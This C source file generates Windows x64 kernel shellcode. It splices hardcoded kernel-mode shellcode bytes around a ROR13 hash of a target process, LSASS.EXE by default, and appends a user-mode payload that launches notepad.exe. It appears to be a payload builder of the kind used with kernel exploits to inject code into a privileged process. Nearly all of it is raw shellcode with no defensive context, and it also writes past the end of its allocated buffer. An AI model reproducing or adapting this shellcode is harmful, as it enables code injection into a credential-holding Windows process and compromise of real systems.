#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

//globals
int kernel_shellcode_size = 0;
int shellcode_one_part_len = 0;
int shellcode_part_two_len = 0;
int userland_shellcode_size = 0;
char *hMem;

void hexDump(char* desc, void* addr, int len)
{
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
			buff[i % 16] = '.';
		}
		else {
			buff[i % 16] = pc[i];
		}

		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}

uint32_t ror(uint32_t dword, int bits) {
    return (dword >> bits) | (dword << (32 - bits));
}

uint32_t generate_process_hash(const char *process) {
    uint32_t proc_hash = 0;
    size_t len = strlen(process);
    char *proc = (char *)malloc(len + 2);
    strcpy(proc, process);
    proc[len] = '\0';

    for (size_t i = 0; i <= len; i++) {
        proc_hash = ror(proc_hash, 13);
        proc_hash += (unsigned char)proc[i];
    }
    
    free(proc);
    return proc_hash;
}

void make_kernel_shellcode(const uint8_t *ring3, size_t ring3_len, const char *proc_name) {
    uint32_t proc_hash = generate_process_hash(proc_name);
	
	//Length: 780 bytes
    uint8_t shellcode[] = {
     "\x31\xc9\x41\xe2\x01\xc3\x56\x41\x57\x41\x56\x41\x55\x41\x54\x53" 
		"\x55\x48\x89\xe5\x66\x83\xe4\xf0\x48\x83\xec\x20\x4c\x8d\x35\xe3" 
		"\xff\xff\xff\x65\x4c\x8b\x3c\x25\x38\x00\x00\x00\x4d\x8b\x7f\x04" 
		"\x49\xc1\xef\x0c\x49\xc1\xe7\x0c\x49\x81\xef\x00\x10\x00\x00\x49" 
		"\x8b\x37\x66\x81\xfe\x4d\x5a\x75\xef\x41\xbb\x5c\x72\x11\x62\xe8" 
		"\x18\x02\x00\x00\x48\x89\xc6\x48\x81\xc6\x08\x03\x00\x00\x41\xbb" 
		"\x7a\xba\xa3\x30\xe8\x03\x02\x00\x00\x48\x89\xf1\x48\x39\xf0\x77" 
		"\x11\x48\x8d\x90\x00\x05\x00\x00\x48\x39\xf2\x72\x05\x48\x29\xc6" 
		"\xeb\x08\x48\x8b\x36\x48\x39\xce\x75\xe2\x49\x89\xf4\x31\xdb\x89" 
		"\xd9\x83\xc1\x04\x81\xf9\x00\x00\x01\x00\x0f\x8d\x66\x01\x00\x00" 
		"\x4c\x89\xf2\x89\xcb\x41\xbb\x66\x55\xa2\x4b\xe8\xbc\x01\x00\x00" 
		"\x85\xc0\x75\xdb\x49\x8b\x0e\x41\xbb\xa3\x6f\x72\x2d\xe8\xaa\x01" 
		"\x00\x00\x48\x89\xc6\xe8\x50\x01\x00\x00\x41\x81\xf9"
    };
	
	uint8_t shellcode_part_two[] = {
		"\x75\xbc\x49\x8b\x1e\x4d\x8d\x6e\x10\x4c\x89\xea\x48\x89\xd9" 
		"\x41\xbb\xe5\x24\x11\xdc\xe8\x81\x01\x00\x00\x6a\x40\x68\x00\x10" 
		"\x00\x00\x4d\x8d\x4e\x08\x49\xc7\x01\x00\x10\x00\x00\x4d\x31\xc0" 
		"\x4c\x89\xf2\x31\xc9\x48\x89\x0a\x48\xf7\xd1\x41\xbb\x4b\xca\x0a" 
		"\xee\x48\x83\xec\x20\xe8\x52\x01\x00\x00\x85\xc0\x0f\x85\xc8\x00" 
		"\x00\x00\x49\x8b\x3e\x48\x8d\x35\xe9\x00\x00\x00\x31\xc9\x66\x03" 
		"\x0d\xd7\x01\x00\x00\x66\x81\xc1\xf9\x00\xf3\xa4\x48\x89\xde\x48" 
		"\x81\xc6\x08\x03\x00\x00\x48\x89\xf1\x48\x8b\x11\x4c\x29\xe2\x51" 
		"\x52\x48\x89\xd1\x48\x83\xec\x20\x41\xbb\x26\x40\x36\x9d\xe8\x09" 
		"\x01\x00\x00\x48\x83\xc4\x20\x5a\x59\x48\x85\xc0\x74\x18\x48\x8b" 
		"\x80\xc8\x02\x00\x00\x48\x85\xc0\x74\x0c\x48\x83\xc2\x4c\x8b\x02" 
		"\x0f\xba\xe0\x05\x72\x05\x48\x8b\x09\xeb\xbe\x48\x83\xea\x4c\x49" 
		"\x89\xd4\x31\xd2\x80\xc2\x90\x31\xc9\x41\xbb\x26\xac\x50\x91\xe8" 
		"\xc8\x00\x00\x00\x48\x89\xc1\x4c\x8d\x89\x80\x00\x00\x00\x41\xc6" 
		"\x01\xc3\x4c\x89\xe2\x49\x89\xc4\x4d\x31\xc0\x41\x50\x6a\x01\x49" 
		"\x8b\x06\x50\x41\x50\x48\x83\xec\x20\x41\xbb\xac\xce\x55\x4b\xe8" 
		"\x98\x00\x00\x00\x31\xd2\x52\x52\x41\x58\x41\x59\x4c\x89\xe1\x41" 
		"\xbb\x18\x38\x09\x9e\xe8\x82\x00\x00\x00\x4c\x89\xe9\x41\xbb\x22" 
		"\xb7\xb3\x7d\xe8\x74\x00\x00\x00\x48\x89\xd9\x41\xbb\x0d\xe2\x4d" 
		"\x85\xe8\x66\x00\x00\x00\x48\x89\xec\x5d\x5b\x41\x5c\x41\x5d\x41" 
		"\x5e\x41\x5f\x5e\xc3\xe9\xb5\x00\x00\x00\x4d\x31\xc9\x31\xc0\xac" 
		"\x41\xc1\xc9\x0d\x3c\x61\x7c\x02\x2c\x20\x41\x01\xc1\x38\xe0\x75" 
		"\xec\xc3\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" 
		"\x20\x48\x8b\x12\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x45\x31\xc9" 
		"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1" 
		"\xe2\xee\x45\x39\xd9\x75\xda\x4c\x8b\x7a\x20\xc3\x4c\x89\xf8\x41" 
		"\x51\x41\x50\x52\x51\x56\x48\x89\xc2\x8b\x42\x3c\x48\x01\xd0\x8b" 
		"\x80\x88\x00\x00\x00\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20" 
		"\x49\x01\xd0\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\xe8\x78\xff" 
		"\xff\xff\x45\x39\xd9\x75\xec\x58\x44\x8b\x40\x24\x49\x01\xd0\x66" 
		"\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48" 
		"\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5b\x41\x53\xff\xe0\x56" 
		"\x41\x57\x55\x48\x89\xe5\x48\x83\xec\x20\x41\xbb\xda\x16\xaf\x92" 
		"\xe8\x4d\xff\xff\xff\x31\xc9\x51\x51\x51\x51\x41\x59\x4c\x8d\x05" 
		"\x1a\x00\x00\x00\x5a\x48\x83\xec\x20\x41\xbb\x46\x45\x1b\x22\xe8" 
		"\x68\xff\xff\xff\x48\x89\xec\x5d\x41\x5f\x5e\xc3" };
    shellcode_one_part_len = sizeof(shellcode) / sizeof(shellcode[0]);
  	shellcode_one_part_len -= 1; //remove NULL terminator
  	
  	shellcode_part_two_len = sizeof(shellcode_part_two) / sizeof(shellcode_part_two[0]);
  	shellcode_part_two_len -= 1; //remove NULL terminator
  	
  	kernel_shellcode_size = shellcode_one_part_len + shellcode_part_two_len + 4;
  	
  	printf("Total size of kernel shellcode:  %d\n", kernel_shellcode_size);
  	
  	hMem = (unsigned char*)malloc(kernel_shellcode_size);
  	
    memcpy(hMem, shellcode, shellcode_one_part_len);
    memcpy(hMem + shellcode_one_part_len, &proc_hash, sizeof(proc_hash));
  	memcpy(hMem + shellcode_one_part_len + sizeof(proc_hash), shellcode_part_two, shellcode_part_two_len);
  	
  	//hexDump(NULL, hMem , shellcode_one_part_len + 4);
  	
  	memcpy(hMem + kernel_shellcode_size, &ring3_len, sizeof(uint16_t));
    memcpy(hMem + kernel_shellcode_size + sizeof(uint16_t), ring3, ring3_len);
}


int main() {
    const char *proc_name = "LSASS.EXE";
    
    uint32_t hash = generate_process_hash(proc_name);
    printf("Process Hash for %s: 0x%08X\n", proc_name, hash);
    
    // Convert hash to little-endian format
    unsigned char hash_le[4];
    hash_le[0] = (hash & 0xFF);
    hash_le[1] = ((hash >> 8) & 0xFF);
    hash_le[2] = ((hash >> 16) & 0xFF);
    hash_le[3] = ((hash >> 24) & 0xFF);
    printf("Little-endian Hash to append: %02X %02X %02X %02X\n", hash_le[0], hash_le[1], hash_le[2], hash_le[3]);
  
    // Example ring3 payload
    uint8_t ring3[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                  0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                  0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                  0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                  0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                  0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                  0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                  0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                  0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                  0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                  0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                  0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                  0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                  0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                  0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                  0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                  0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x6e,0x6f,0x74,
                  0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00 }; 
    size_t ring3_len = sizeof(ring3) / sizeof(ring3[0]);
    ring3_len -= 1;
    printf("ring3 payload len:  %d\n", ring3_len);
    
    make_kernel_shellcode(ring3, ring3_len, proc_name);
    hexDump(NULL, hMem, kernel_shellcode_size);
	
    printf("Generated payload for process: %s\n", proc_name);
	  free(hMem);
	
    return 0;
}
